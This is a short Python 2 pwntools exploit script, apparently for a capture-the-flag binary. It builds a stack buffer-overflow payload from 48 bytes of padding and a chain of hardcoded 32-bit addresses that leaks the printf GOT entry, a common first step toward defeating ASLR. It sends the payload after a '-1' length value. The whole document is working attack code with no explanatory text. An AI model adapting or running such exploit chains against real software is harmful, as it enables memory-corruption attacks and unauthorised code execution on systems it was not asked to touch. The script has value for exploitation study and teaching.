#!/usr/bin/python
from pwn import *

buf = ""
buf += "A"*48
buf += p32(0x08048370)
buf += p32(0x0804852f)
buf += p32(0x08048702)           # str: .... %s ....
buf += p32(0x0804a00c)           # ptr to printf@got

print "-1\n"+buf

